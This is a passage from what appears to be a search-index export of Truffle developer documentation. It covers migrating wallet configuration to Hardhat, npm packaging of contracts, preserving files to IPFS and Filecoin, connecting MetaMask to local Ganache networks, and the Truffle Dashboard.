the Ethers Signer interface module . exports = { networks : { // in built test network to use when developing contracts hardhat : { chainId : 1337 }, quickstart : { url : \"http://127.0.0.1:8545\" , chainId : 1337 , // test accounts only, all good ;) accounts : [ \"0x8f2a55949038a9610f50fb23b5883af3b4ecb3c3bb792cbcefbd1542c692be63\" , \"0xc87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3\" , \"0xae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f\" ] }, } } You can access the first 2 accounts using the following code: const [ owner , otherAccount ] = await ethers . getSigners ();", "title": "Configure your wallet"}, {"location": "docs/truffle/how-to/migrate-to-hardhat/#generate-the-wallet-from-a-mnemonic-phrase", "text": "In your code, generate the wallet from a mnemonic phrase defined in your hardhat.config.js file as follows: import { ethers } = require ( \"ethers\" ); import { HDNodeWallet } from 'ethers' ; let node = ethers . HDNodeWallet . fromMnemonic ( words )", "title": "Generate the wallet from a mnemonic phrase"}, {"location": "docs/truffle/how-to/migrate-to-hardhat/#connect-with-metamask", "text": "To connect to your HardHat Network using your MetaMask wallet, use the following: const provider = new ethers . BrowserProvider ( window . ethereum )", "title": "Connect with MetaMask"}, {"location": "docs/truffle/how-to/migrate-to-hardhat/#load-a-wallet-from-an-existing-private-key", "text": "You can load a wallet from an existing private key on your specified network, using the following code: import { ethers } from \"hardhat\" const provider = new ethers . JsonRpcApiProvider ( \"JSON-RPC-http-endpoint\" ); const wallet = new ethers . Wallet ( \"0xMY_PRIVATE_KEY\" ); const signer = wallet . connect ( provider ); # optionally with a provider directly const wallet = new ethers . Wallet ( \"0xMY_PRIVATE_KEY\" , provider );", "title": "Load a wallet from an existing private key"}, {"location": "docs/truffle/how-to/migrate-to-hardhat/#references", "text": "HardHat developer documentation Example scripts to send transactions", "title": "References"}, {"location": "docs/truffle/how-to/package-management-via-npm/", "text": "Package Management via NPM \u00b6 Truffle comes standard with npm integration, and is aware of the node_modules directory in your project if it exists. This means you can use and distribute contracts, dapps and Ethereum-enabled libraries via npm , making your code available to others and other's code available to you. Package layout \u00b6 Projects created with Truffle have a specific layout by default which enables them to be used as packages. This layout isn't required, but if used as a common convention -- or \"de-facto standard\" -- then distributing contracts and dapps through NPM will become much easier. The most important directories in a Truffle package are the following: /contracts /build (which includes /build/contracts , created by Truffle) The first directory is your contracts directory, which includes your raw Solidity contracts. The second directory is the build directory, and more specifically /build/contracts , which holds build artifacts in the form of .json files. Including raw contracts in your package will allow others to import those contracts within their own solidity code. Similarly, including your .json build artifacts in your package will allow others to seamlessly interact with your contracts from JavaScript, which can be used in dapps, scripts and migrations. Using a package \u00b6 When using a package within your own project, it is important to note that there are two places where you might be interested in using other's contract code: within your contracts and within your Javascript code (migrations and tests). The following provides an example of each case, and discusses techniques for making the most of other's contracts and build artifacts. Installing \u00b6 For this example, we're going to use the Example Truffle Library , which provides a simple name registry that is deployed to the Morden test network. In order to use it as a dependency, we must first install it within our project through npm : $ cd my_project $ npm install example-truffle-library Note that the last command above downloads the package and places it in my_project/node_modules directory, which is important for the examples below. See the npm documentation for help using npm to install packages. Within your contracts \u00b6 To use a package's contracts within your contracts, this can be as simple as Solidity's import statement. When your import path isn't explicitly relative or absolute , this signifies to Truffle that you're looking for a file from a specific named package. Consider this example using the Example Truffle Library mentioned above: import \"example-truffle-library/contracts/SimpleNameRegistry.sol\" ; Since the path didn't start with ./ , Truffle knows to look in your project's node_modules directory for the example-truffle-library folder. From there, it resolves the path to provide you the contract you requested. Within JavaScript code \u00b6 To interact with package's contracts within JavaScript code, you simply need to require that package's .json files, and then use the @truffle/contract module to turn those into usable abstractions: var contract = require ( \"@truffle/contract\" ); var data = require ( \"example-truffle-library/build/contracts/SimpleNameRegistry.json\" ); var SimpleNameRegistry = contract ( data ); To use these abstractions, see the Interacting With Your Contracts section for more details. Package's deployed addresses \u00b6 Sometimes you want your contracts to interact with the package's previously deployed contracts. Since the deployed addresses exist within the package's .json files, you must perform an extra step to get those addresses into your contracts. To do so, make your contract accept the address of the dependency contract, and then use migrations. The following is an example contract that exists within your project as well as an example migration: Contract: MyContract.sol pragma solidity ^ 0.4.13 ; import \"example-truffle-library/contracts/SimpleNameRegistry.sol\" ; contract MyContract { SimpleNameRegistry registry ; address public owner ; function MyContract { owner = msg.sender ; } // Simple example that uses the deployed registry from the package. function getModule ( bytes32 name ) returns ( address ) { return registry . names ( name ); } // Set the registry if you're the owner. function setRegistry ( address addr ) { require ( msg.sender == owner ); registry = SimpleNameRegistry ( addr ); } } Migration: 3_hook_up_example_library.js // Note that artifacts.require takes care of creating an abstraction for us. var SimpleNameRegistry = artifacts . require ( \"example-truffle-library/SimpleNameRegistry\" ); module . exports = function ( deployer ) { // Deploy our contract, then set the address of the registry. deployer . deploy ( MyContract ). then ( function () { return MyContract . deployed (); }). then ( function ( deployed ) { return deployed . setRegistry ( SimpleNameRegistry . address ); }); }; Before publishing \u00b6 When using a network like the default develop network that's configured to match any Ethereum client (like Ganache or Truffle Develop), you're bound to have network artifacts lying around that you don't want published. Before publishing your package, consider running the following command to remove any extraneous network artifacts: $ truffle networks --clean See the command reference for more information.", "title": "Use NPM package manager"}, {"location": "docs/truffle/how-to/package-management-via-npm/#package-management-via-npm", "text": "Truffle comes standard with npm integration, and is aware of the node_modules directory in your project if it exists. This means you can use and distribute contracts, dapps and Ethereum-enabled libraries via npm , making your code available to others and other's code available to you.", "title": "Package Management via NPM"}, {"location": "docs/truffle/how-to/package-management-via-npm/#package-layout", "text": "Projects created with Truffle have a specific layout by default which enables them to be used as packages. This layout isn't required, but if used as a common convention -- or \"de-facto standard\" -- then distributing contracts and dapps through NPM will become much easier. The most important directories in a Truffle package are the following: /contracts /build (which includes /build/contracts , created by Truffle) The first directory is your contracts directory, which includes your raw Solidity contracts. The second directory is the build directory, and more specifically /build/contracts , which holds build artifacts in the form of .json files. Including raw contracts in your package will allow others to import those contracts within their own solidity code. Similarly, including your .json build artifacts in your package will allow others to seamlessly interact with your contracts from JavaScript, which can be used in dapps, scripts and migrations.", "title": "Package layout"}, {"location": "docs/truffle/how-to/package-management-via-npm/#using-a-package", "text": "When using a package within your own project, it is important to note that there are two places where you might be interested in using other's contract code: within your contracts and within your Javascript code (migrations and tests). The following provides an example of each case, and discusses techniques for making the most of other's contracts and build artifacts.", "title": "Using a package"}, {"location": "docs/truffle/how-to/package-management-via-npm/#installing", "text": "For this example, we're going to use the Example Truffle Library , which provides a simple name registry that is deployed to the Morden test network. In order to use it as a dependency, we must first install it within our project through npm : $ cd my_project $ npm install example-truffle-library Note that the last command above downloads the package and places it in my_project/node_modules directory, which is important for the examples below. See the npm documentation for help using npm to install packages.", "title": "Installing"}, {"location": "docs/truffle/how-to/package-management-via-npm/#within-your-contracts", "text": "To use a package's contracts within your contracts, this can be as simple as Solidity's import statement. When your import path isn't explicitly relative or absolute , this signifies to Truffle that you're looking for a file from a specific named package. Consider this example using the Example Truffle Library mentioned above: import \"example-truffle-library/contracts/SimpleNameRegistry.sol\" ; Since the path didn't start with ./ , Truffle knows to look in your project's node_modules directory for the example-truffle-library folder. From there, it resolves the path to provide you the contract you requested.", "title": "Within your contracts"}, {"location": "docs/truffle/how-to/package-management-via-npm/#within-javascript-code", "text": "To interact with package's contracts within JavaScript code, you simply need to require that package's .json files, and then use the @truffle/contract module to turn those into usable abstractions: var contract = require ( \"@truffle/contract\" ); var data = require ( \"example-truffle-library/build/contracts/SimpleNameRegistry.json\" ); var SimpleNameRegistry = contract ( data ); To use these abstractions, see the Interacting With Your Contracts section for more details.", "title": "Within JavaScript code"}, {"location": "docs/truffle/how-to/package-management-via-npm/#packages-deployed-addresses", "text": "Sometimes you want your contracts to interact with the package's previously deployed contracts. Since the deployed addresses exist within the package's .json files, you must perform an extra step to get those addresses into your contracts. To do so, make your contract accept the address of the dependency contract, and then use migrations. The following is an example contract that exists within your project as well as an example migration: Contract: MyContract.sol pragma solidity ^ 0.4.13 ; import \"example-truffle-library/contracts/SimpleNameRegistry.sol\" ; contract MyContract { SimpleNameRegistry registry ; address public owner ; function MyContract { owner = msg.sender ; } // Simple example that uses the deployed registry from the package. function getModule ( bytes32 name ) returns ( address ) { return registry . names ( name ); } // Set the registry if you're the owner. function setRegistry ( address addr ) { require ( msg.sender == owner ); registry = SimpleNameRegistry ( addr ); } } Migration: 3_hook_up_example_library.js // Note that artifacts.require takes care of creating an abstraction for us. var SimpleNameRegistry = artifacts . require ( \"example-truffle-library/SimpleNameRegistry\" ); module . exports = function ( deployer ) { // Deploy our contract, then set the address of the registry. deployer . deploy ( MyContract ). then ( function () { return MyContract . deployed (); }). then ( function ( deployed ) { return deployed . setRegistry ( SimpleNameRegistry . address ); }); };", "title": "Package's deployed addresses"}, {"location": "docs/truffle/how-to/package-management-via-npm/#before-publishing", "text": "When using a network like the default develop network that's configured to match any Ethereum client (like Ganache or Truffle Develop), you're bound to have network artifacts lying around that you don't want published. Before publishing your package, consider running the following command to remove any extraneous network artifacts: $ truffle networks --clean See the command reference for more information.", "title": "Before publishing"}, {"location": "docs/truffle/how-to/preserve-files-and-content-to-storage-platforms/", "text": "Preserve files and content to storage platforms \u00b6 Preserving to IPFS, Filecoin or Textile Buckets \u00b6 The truffle preserve command comes preconfigured with the ability to preserve files to IPFS, Filecoin or Textile Buckets. IPFS \u00b6 To preserve your files to IPFS use the --ipfs flag. $ truffle preserve ./path --ipfs [ --environment <name> ] Configuration \u00b6 By default, the connection to IPFS is done with a local node presumed to be running at http://localhost:5001 . This is the default for an ipfs daemon and also for ganache filecoin . It is possible to point to a different IPFS node by configuing a different URL in a truffle-config.js environment. module . exports = { /* ... rest of truffle-config */ environments : { /* ... other environments */ production : { ipfs : { address : 'https://ipfs.infura.io:5001' } } } } Filecoin \u00b6 To preserve your files to Filecoin use the --filecoin flag. $ truffle preserve ./path --filecoin [ --environment <name> ] Configuration \u00b6 By default, the connection to Filecoin is done with a local node presumed to be running at http://localhost:7777/rpc/v0 . This is the default for a mainnet or localnet Lotus or Powergate node and also for ganache filecoin . It is possible to point to a different Filecoin node by configuing a different URL in a truffle-config.js environment. Besides the connection URL, you can also configure Filecoin storage deal options such as the duration or price. module . exports = { /* ... rest of truffle-config */ environments : { /* ... other environments */ development : { filecoin : { address : 'http://localhost:1234/rpc/v0' , token : 'AUTH_TOKEN' , storageDealOptions : { epochPrice : \"2500\" , duration : 518400 , // 180 days } } } } } Textile Buckets \u00b6 To preserve your files to Textile Buckets use the --buckets flag. $ truffle preserve ./path --buckets [ --environment <name> ] Configuration \u00b6 Textile Buckets requires some configuration in order to work with truffle preserve . To get started, you need to install Textile's hub tool , register and create authentication keys. hub init hub keys create - account - Require Signature Authentication ( recommended ) : N After generating these keys, they need to be added to an environment in your truffle-config.js file as well as the name of the bucket that you want to preserve your files to - it's possible to use an existing bucket for this, or if it doesn't exist yet it will be created in the process. module . exports = { /* ... rest of truffle-config */ environments : { /* ... other environments */ development : { buckets : { key : \"MY_BUCKETS_KEY\" , secret : \"MY_BUCKETS_SECRET\" , bucketName : \"truffle-preserve-bucket\" , } } } } Preserving with custom preserve recipes \u00b6 While Truffle comes bundled with support for IPFS, Filecoin and Textile Buckets, additional workflows (or recipes) can be defined and used. Plugin installation / configuration \u00b6 Install the plugin from NPM. npm install --save-dev truffle-preserve-to-my-server Add a plugins section to your Truffle config. module . exports = { /* ... rest of truffle-config */ plugins : [ \"truffle-preserve-to-my-server\" ] } Add any required configuration options to your Truffle config if it's required by the plugin. Refer to the plugin's documentation for this. Plugin usage \u00b6 After installation and configuration, the plugin's tag (e.g. --my-server ) will show up in truffle help preserve and can be used with truffle preserve . truffle preserve ./path --my-server Creating custom preserve recipes \u00b6 Refer to the following resources to get started creating your own custom recipes: @truffle/preserve Typedocs @truffle/preserve-to-ipfs source code @truffle/preserve-to-filecoin source code @truffle/preserve-to-buckets source code", "title": "Preserve content"}, {"location": "docs/truffle/how-to/preserve-files-and-content-to-storage-platforms/#preserve-files-and-content-to-storage-platforms", "text": "", "title": "Preserve files and content to storage platforms"}, {"location": "docs/truffle/how-to/preserve-files-and-content-to-storage-platforms/#preserving-to-ipfs-filecoin-or-textile-buckets", "text": "The truffle preserve command comes preconfigured with the ability to preserve files to IPFS, Filecoin or Textile Buckets.", "title": "Preserving to IPFS, Filecoin or Textile Buckets"}, {"location": "docs/truffle/how-to/preserve-files-and-content-to-storage-platforms/#ipfs", "text": "To preserve your files to IPFS use the --ipfs flag. $ truffle preserve ./path --ipfs [ --environment <name> ]", "title": "IPFS"}, {"location": "docs/truffle/how-to/preserve-files-and-content-to-storage-platforms/#configuration", "text": "By default, the connection to IPFS is done with a local node presumed to be running at http://localhost:5001 . This is the default for an ipfs daemon and also for ganache filecoin . It is possible to point to a different IPFS node by configuing a different URL in a truffle-config.js environment. module . exports = { /* ... rest of truffle-config */ environments : { /* ... other environments */ production : { ipfs : { address : 'https://ipfs.infura.io:5001' } } } }", "title": "Configuration"}, {"location": "docs/truffle/how-to/preserve-files-and-content-to-storage-platforms/#filecoin", "text": "To preserve your files to Filecoin use the --filecoin flag. $ truffle preserve ./path --filecoin [ --environment <name> ]", "title": "Filecoin"}, {"location": "docs/truffle/how-to/preserve-files-and-content-to-storage-platforms/#configuration_1", "text": "By default, the connection to Filecoin is done with a local node presumed to be running at http://localhost:7777/rpc/v0 . This is the default for a mainnet or localnet Lotus or Powergate node and also for ganache filecoin . It is possible to point to a different Filecoin node by configuing a different URL in a truffle-config.js environment. Besides the connection URL, you can also configure Filecoin storage deal options such as the duration or price. module . exports = { /* ... rest of truffle-config */ environments : { /* ... other environments */ development : { filecoin : { address : 'http://localhost:1234/rpc/v0' , token : 'AUTH_TOKEN' , storageDealOptions : { epochPrice : \"2500\" , duration : 518400 , // 180 days } } } } }", "title": "Configuration"}, {"location": "docs/truffle/how-to/preserve-files-and-content-to-storage-platforms/#textile-buckets", "text": "To preserve your files to Textile Buckets use the --buckets flag. $ truffle preserve ./path --buckets [ --environment <name> ]", "title": "Textile Buckets"}, {"location": "docs/truffle/how-to/preserve-files-and-content-to-storage-platforms/#configuration_2", "text": "Textile Buckets requires some configuration in order to work with truffle preserve . To get started, you need to install Textile's hub tool , register and create authentication keys. hub init hub keys create - account - Require Signature Authentication ( recommended ) : N After generating these keys, they need to be added to an environment in your truffle-config.js file as well as the name of the bucket that you want to preserve your files to - it's possible to use an existing bucket for this, or if it doesn't exist yet it will be created in the process. module . exports = { /* ... rest of truffle-config */ environments : { /* ... other environments */ development : { buckets : { key : \"MY_BUCKETS_KEY\" , secret : \"MY_BUCKETS_SECRET\" , bucketName : \"truffle-preserve-bucket\" , } } } }", "title": "Configuration"}, {"location": "docs/truffle/how-to/preserve-files-and-content-to-storage-platforms/#preserving-with-custom-preserve-recipes", "text": "While Truffle comes bundled with support for IPFS, Filecoin and Textile Buckets, additional workflows (or recipes) can be defined and used.", "title": "Preserving with custom preserve recipes"}, {"location": "docs/truffle/how-to/preserve-files-and-content-to-storage-platforms/#plugin-installation-configuration", "text": "Install the plugin from NPM. npm install --save-dev truffle-preserve-to-my-server Add a plugins section to your Truffle config. module . exports = { /* ... rest of truffle-config */ plugins : [ \"truffle-preserve-to-my-server\" ] } Add any required configuration options to your Truffle config if it's required by the plugin. Refer to the plugin's documentation for this.", "title": "Plugin installation / configuration"}, {"location": "docs/truffle/how-to/preserve-files-and-content-to-storage-platforms/#plugin-usage", "text": "After installation and configuration, the plugin's tag (e.g. --my-server ) will show up in truffle help preserve and can be used with truffle preserve . truffle preserve ./path --my-server", "title": "Plugin usage"}, {"location": "docs/truffle/how-to/preserve-files-and-content-to-storage-platforms/#creating-custom-preserve-recipes", "text": "Refer to the following resources to get started creating your own custom recipes: @truffle/preserve Typedocs @truffle/preserve-to-ipfs source code @truffle/preserve-to-filecoin source code @truffle/preserve-to-buckets source code", "title": "Creating custom preserve recipes"}, {"location": "docs/truffle/how-to/truffle-with-metamask/", "text": "Truffle and MetaMask \u00b6 Before you can interact with smart contracts in a browser, make sure they're compiled, deployed, and that you're interacting with them via web3 in client-side JavaScript. We recommend using the @truffle/contract library, as it makes interacting with contracts easier and more robust. Note : For more information on these topics, including using @truffle/contract , check out our Pet Shop tutorial. Once you've done the above, you're ready to use MetaMask. What is MetaMask? \u00b6 MetaMask is the easiest way to interact with dapps in a browser. It is an extension for Chrome or Firefox that connects to an Ethereum network without running a full node on the browser's machine. It can connect to the main Ethereum network, any of the testnets (Ropsten, Kovan, and Rinkeby), or a local blockchain such as the one created by Ganache or Truffle Develop. For development with Truffle this means we can use our dapp the same way users will interact with it on a live network. Installing MetaMask \u00b6 To install MetaMask for Chrome, go to the Chrome Web Store and click the Add to Chrome button. To install MetaMask for FireFox, go to the Firefox Add-ons page and click the Add to Firefox button. With our front-end ready to be used and MetaMask installed, we're ready to see our dapp in all its glory. Using MetaMask with Ganache \u00b6 Ganache is a graphical application that runs a blockchain that can be used for testing purposes. It runs on 127.0.0.1:7545 . Note : We recommend specifying 127.0.0.1 instead of localhost because the address does not require a network connection and so is more suitable for development. Detecting MetaMask's web3 injection \u00b6 Before diving in, we'll need to make sure the dapp is checking for MetaMask's web3 instance and that the extension itself is configured properly with Ganache. MetaMask injects its own web3 instance, so we'll want to make sure we're checking for that. After the window has loaded perform the following check: // Is there an injected web3 instance? if ( typeof web3 !== 'undefined' ) { App . web3Provider = web3 . currentProvider ; web3 = new Web3 ( web3 . currentProvider ); } else { // If no injected web3 instance is detected, fallback to Ganache. App . web3Provider = new web3 . providers . HttpProvider ( 'http://127.0.0.1:7545' ); web3 = new Web3 ( App . web3Provider ); } Setting up MetaMask \u00b6 To use Ganache with MetaMask, click the MetaMask icon in your browser and this screen will appear: MetaMask initial screen Click Import with seed phrase . In the box marked Wallet Seed , enter the mnemonic that was displayed when launching Ganache. Warning : Do not use this mnemonic on the main Ethereum network (mainnet). Make sure that you set the network to \"Private Network\" (use the \"Custom RPC\" setting). See below for details. Enter a password below that and click OK . MetaMask seed phrase Now we need to connect MetaMask to the blockchain created by Ganache. Click the menu that shows \"Main Network\" and select Custom RPC . MetaMask network menu In the box titled \"New RPC URL\" (to the right of \"New Network\") enter http://127.0.0.1:7545 and click Save . The network name at the top will switch to say \"Private Network\". Click the cross in the top-right of the current window close out of the page and return to the Accounts page. Now that we've connected MetaMask to Ganache, you'll be taken to the accounts screen. Each account created by Ganache is given 100 ether. The first account should have less than the others because that account supplies the gas for smart contract deployment. Since you've deployed your smart contract to the network, this account paid for it. Click the account icon in the upper-right to create new accounts, the first 10 of which will correspond to the 10 accounts displayed when you launched Ganache. MetaMask account Using MetaMask with Truffle Develop \u00b6 Truffle Develop is a command-line application that runs a temporary blockchain that is also used for testing purposes. It runs on 127.0.0.1:9545 . Note : We recommend specifying 127.0.0.1 instead of localhost because the address does not require a network connection and so is more suitable for development. Using MetaMask with Truffle Develop is very similar to that of Ganache. The only difference is that Truffle Develop runs by default on 127.0.0.1:9545 , so you'll want to edit the above web3 code to say: // Is there is an injected web3 instance? if ( typeof web3 !== 'undefined' ) { App . web3Provider = web3 . currentProvider ; web3 = new Web3 ( web3 . currentProvider ); } else { // If no injected web3 instance is detected, fallback to Truffle Develop. App . web3Provider = new web3 . providers . HttpProvider ( 'http://127.0.0.1:9545' ); web3 = new Web3 ( App . web3Provider ); } In MetaMask, when entering the \"New RPC URL\", enter http://127.0.0.1:9545 . Using MetaMask with Ganache CLI \u00b6 Using MetaMask with Ganache CLI is also very similar to that of Ganache. The only difference is that Ganache CLI runs by default on http://127.0.0.1:8545 so you'll want to edit the above web3 code to say: // Is there is an injected web3 instance? if ( typeof web3 !== 'undefined' ) { App . web3Provider = web3 . currentProvider ; web3 = new Web3 ( web3 . currentProvider ); } else { // If no injected web3 instance is detected, fallback to Ganache CLI. App . web3Provider = new web3 . providers . HttpProvider ( 'http://127.0.0.1:8545' ); web3 = new Web3 ( App . web3Provider ); } In MetaMask, when entering the \"New RPC URL\", enter http://127.0.0.1:8545 .", "title": "Integrate with MetaMask"}, {"location": "docs/truffle/how-to/truffle-with-metamask/#truffle-and-metamask", "text": "Before you can interact with smart contracts in a browser, make sure they're compiled, deployed, and that you're interacting with them via web3 in client-side JavaScript. We recommend using the @truffle/contract library, as it makes interacting with contracts easier and more robust. Note : For more information on these topics, including using @truffle/contract , check out our Pet Shop tutorial. Once you've done the above, you're ready to use MetaMask.", "title": "Truffle and MetaMask"}, {"location": "docs/truffle/how-to/truffle-with-metamask/#what-is-metamask", "text": "MetaMask is the easiest way to interact with dapps in a browser. It is an extension for Chrome or Firefox that connects to an Ethereum network without running a full node on the browser's machine. It can connect to the main Ethereum network, any of the testnets (Ropsten, Kovan, and Rinkeby), or a local blockchain such as the one created by Ganache or Truffle Develop. For development with Truffle this means we can use our dapp the same way users will interact with it on a live network.", "title": "What is MetaMask?"}, {"location": "docs/truffle/how-to/truffle-with-metamask/#installing-metamask", "text": "To install MetaMask for Chrome, go to the Chrome Web Store and click the Add to Chrome button. To install MetaMask for FireFox, go to the Firefox Add-ons page and click the Add to Firefox button. With our front-end ready to be used and MetaMask installed, we're ready to see our dapp in all its glory.", "title": "Installing MetaMask"}, {"location": "docs/truffle/how-to/truffle-with-metamask/#using-metamask-with-ganache", "text": "Ganache is a graphical application that runs a blockchain that can be used for testing purposes. It runs on 127.0.0.1:7545 . Note : We recommend specifying 127.0.0.1 instead of localhost because the address does not require a network connection and so is more suitable for development.", "title": "Using MetaMask with Ganache"}, {"location": "docs/truffle/how-to/truffle-with-metamask/#detecting-metamasks-web3-injection", "text": "Before diving in, we'll need to make sure the dapp is checking for MetaMask's web3 instance and that the extension itself is configured properly with Ganache. MetaMask injects its own web3 instance, so we'll want to make sure we're checking for that. After the window has loaded perform the following check: // Is there an injected web3 instance? if ( typeof web3 !== 'undefined' ) { App . web3Provider = web3 . currentProvider ; web3 = new Web3 ( web3 . currentProvider ); } else { // If no injected web3 instance is detected, fallback to Ganache. App . web3Provider = new web3 . providers . HttpProvider ( 'http://127.0.0.1:7545' ); web3 = new Web3 ( App . web3Provider ); }", "title": "Detecting MetaMask's web3 injection"}, {"location": "docs/truffle/how-to/truffle-with-metamask/#setting-up-metamask", "text": "To use Ganache with MetaMask, click the MetaMask icon in your browser and this screen will appear: MetaMask initial screen Click Import with seed phrase . In the box marked Wallet Seed , enter the mnemonic that was displayed when launching Ganache. Warning : Do not use this mnemonic on the main Ethereum network (mainnet). Make sure that you set the network to \"Private Network\" (use the \"Custom RPC\" setting). See below for details. Enter a password below that and click OK . MetaMask seed phrase Now we need to connect MetaMask to the blockchain created by Ganache. Click the menu that shows \"Main Network\" and select Custom RPC . MetaMask network menu In the box titled \"New RPC URL\" (to the right of \"New Network\") enter http://127.0.0.1:7545 and click Save . The network name at the top will switch to say \"Private Network\". Click the cross in the top-right of the current window close out of the page and return to the Accounts page. Now that we've connected MetaMask to Ganache, you'll be taken to the accounts screen. Each account created by Ganache is given 100 ether. The first account should have less than the others because that account supplies the gas for smart contract deployment. Since you've deployed your smart contract to the network, this account paid for it. Click the account icon in the upper-right to create new accounts, the first 10 of which will correspond to the 10 accounts displayed when you launched Ganache. MetaMask account", "title": "Setting up MetaMask"}, {"location": "docs/truffle/how-to/truffle-with-metamask/#using-metamask-with-truffle-develop", "text": "Truffle Develop is a command-line application that runs a temporary blockchain that is also used for testing purposes. It runs on 127.0.0.1:9545 . Note : We recommend specifying 127.0.0.1 instead of localhost because the address does not require a network connection and so is more suitable for development. Using MetaMask with Truffle Develop is very similar to that of Ganache. The only difference is that Truffle Develop runs by default on 127.0.0.1:9545 , so you'll want to edit the above web3 code to say: // Is there is an injected web3 instance? if ( typeof web3 !== 'undefined' ) { App . web3Provider = web3 . currentProvider ; web3 = new Web3 ( web3 . currentProvider ); } else { // If no injected web3 instance is detected, fallback to Truffle Develop. App . web3Provider = new web3 . providers . HttpProvider ( 'http://127.0.0.1:9545' ); web3 = new Web3 ( App . web3Provider ); } In MetaMask, when entering the \"New RPC URL\", enter http://127.0.0.1:9545 .", "title": "Using MetaMask with Truffle Develop"}, {"location": "docs/truffle/how-to/truffle-with-metamask/#using-metamask-with-ganache-cli", "text": "Using MetaMask with Ganache CLI is also very similar to that of Ganache. The only difference is that Ganache CLI runs by default on http://127.0.0.1:8545 so you'll want to edit the above web3 code to say: // Is there is an injected web3 instance? if ( typeof web3 !== 'undefined' ) { App . web3Provider = web3 . currentProvider ; web3 = new Web3 ( web3 . currentProvider ); } else { // If no injected web3 instance is detected, fallback to Ganache CLI. App . web3Provider = new web3 . providers . HttpProvider ( 'http://127.0.0.1:8545' ); web3 = new Web3 ( App . web3Provider ); } In MetaMask, when entering the \"New RPC URL\", enter http://127.0.0.1:8545 .", "title": "Using MetaMask with Ganache CLI"}, {"location": "docs/truffle/how-to/use-the-build-pipeline/", "text": "Use the build pipeline \u00b6 Alert : This command is deprecated. Please use third-party build tools like webpack or grunt, or see our Truffle Boxes for an example. Truffle 1.0 and 2.0 came standard with a default build system heavily geared toward web applications (here, the term \"build\" means turning code artifacts into HTML, Javascript and CSS). That build system has been pulled out into its own module to make Truffle usable and extensible for all kinds of applications. Truffle can be configured for tight integration with any build system. To configure a custom build system, see the Advanced Build Processes section for more details. Command \u00b6 To build your application when a build system is configured, run: $ truffle build Note you'll receive an error if you try to run the build command without first configuring a custom build process.", "title": "Use the build pipeline"}, {"location": "docs/truffle/how-to/use-the-build-pipeline/#use-the-build-pipeline", "text": "Alert : This command is deprecated. Please use third-party build tools like webpack or grunt, or see our Truffle Boxes for an example. Truffle 1.0 and 2.0 came standard with a default build system heavily geared toward web applications (here, the term \"build\" means turning code artifacts into HTML, Javascript and CSS). That build system has been pulled out into its own module to make Truffle usable and extensible for all kinds of applications. Truffle can be configured for tight integration with any build system. To configure a custom build system, see the Advanced Build Processes section for more details.", "title": "Use the build pipeline"}, {"location": "docs/truffle/how-to/use-the-build-pipeline/#command", "text": "To build your application when a build system is configured, run: $ truffle build Note you'll receive an error if you try to run the build command without first configuring a custom build process.", "title": "Command"}, {"location": "docs/truffle/how-to/use-the-truffle-dashboard/", "text": "Use Truffle Dashboard \u00b6 When deploying your smart contracts you need to specify an Ethereum account that has enough funds to cover the transaction fees of the deployment. A popular method of doing this is copy-pasting your mnemonic phrase to a gitignored .env file so that it can be used for, e.g., the @truffle/hdwallet-provider . However, it is generally a bad practice to copy-paste your keys, especially since we have wallets like MetaMask that can send transactions for us. We developed the Truffle Dashboard to provide an easy way to use your existing MetaMask wallet for your deployments and for other transactions that you need to send from a command line context. Because the Truffle Dashboard connects directly to MetaMask it is also possible to use it in combination with hardware wallets like Ledger or Trezor. Starting a dashboard \u00b6 To start a Truffle Dashboard, you need to run the truffle dashboard command in a separate terminal window. > truffle dashboard [--port <number>] [--host <string>] [--verbose] Truffle Dashboard running at http://localhost:24012 DashboardProvider RPC endpoint running at http://localhost:24012/rpc By default, the command above starts a dashboard at http://localhost:24012 and opens the dashboard in a new tab in your default browser. The Dashboard then prompts you to connect your wallet and confirm that you're connected to the right network. You should double check your connected network at this point, since switching to a different network during a deployment can have unintended consequences. The port and host can be configured through command line options, or by configuring them inside your truffle-config.js . module . exports = { // ... rest of truffle config dashboard : { port : 24012 , } networks : { // ... network configurations, including the network named 'dashboard' } } Connecting to the dashboard \u00b6 To make connecting to the Truffle Dashboard easy, Truffle includes a built in network named \"dashboard\". This built in network automatically uses the port and host specified in the dashboard configuration or falls back to the default http://localhost:24012 . This built in network can be used with all your deployments or scripts. truffle migrate --network dashboard truffle console --network dashboard From there, every Ethereum RPC request will be forwarded from Truffle to the Truffle Dashboard, where the user can inspect the RPC requests and process them with MetaMask. Any additional network options or overrides can be provided by adding a network called \"dashboard\" to your truffle-config.js file and providing network options like you would a regular network. module . exports = { // ... rest of truffle config networks : { // ... rest of network config dashboard : { networkCheckTimeout : 120000 , } } dashboard : { // ... dashboard host/port config } }; Decode requests \u00b6 Truffle Dashboard supports decoding requests for certain RPC calls, allowing you to view a more human-friendly representation of the messaging between your computer and the Ethereum network. Information : The decode functionality is available in Truffle projects for the following methods: eth_sendTransaction , personal_sign , eth_signTypedData_v3 , and eth_signTypedData_v4 . We plan to support non-Truffle tooling such as Hardhat in the future. Each time you run truffle compile , Truffle shares information about your contracts with Truffle Dashboard. Later, when you call a method, Truffle Dashboard consults its repository of this compilation information, and asks @truffle/decoder to translate the request into a human readable format. For example, if you have a contract that allows you to mint 5 tokens and send it to a user ( myaccount.eth in this example), the low-level form would look something like: 0xa0e9439c000000000000000000000000627306090abab3a6e1400e9345bc60c78a8bef570000000000000000000000000000000000000000000000000000000000000005 Truffle Dashboard can display this in a more human-readable format, for example: mint(myaccount.eth, 5) Usage with non-Truffle tooling \u00b6 To make the Truffle Dashboard accessible to everyone, we developed it to be agnostic about the tools you're using. You can use the Truffle Dashboard with non-Truffle tools such as Hardhat. Information : Truffle Dashboard cannot decode requests when using tools other than Truffle or Hardhat (with the plugin outlined below). We plan to add support for additional tools in the future. Using Truffle Dashboard with the Hardhat plugin \u00b6 The plugin brings the complete Truffle Dashboard experience, including decoded transaction information, to your Hardhat projects. See the Installation steps to get it setup for your project. The Hardhat plugin extends npx hardhat compile by sending the compiled artifacts to Truffle Dashboard, enabling seamless integration with your existing workflow. When using the Truffle Dashboard with Hardhat, you need to create a network configuration inside your hardhat.config.js file that specifies the Truffle Dashboard's RPC URL. module . exports = { // ... rest of hardhat config networks : { // ... rest of network config 'truffle-dashboard' : { url : \"http://localhost:24012/rpc\" } }, }; From there, it can be used with any Hardhat task or tools like hardhat-deploy . hardhat deploy --network truffle-dashboard", "title": "Use Truffle Dashboard"}, {"location": "docs/truffle/how-to/use-the-truffle-dashboard/#use-truffle-dashboard", "text": "When deploying your smart 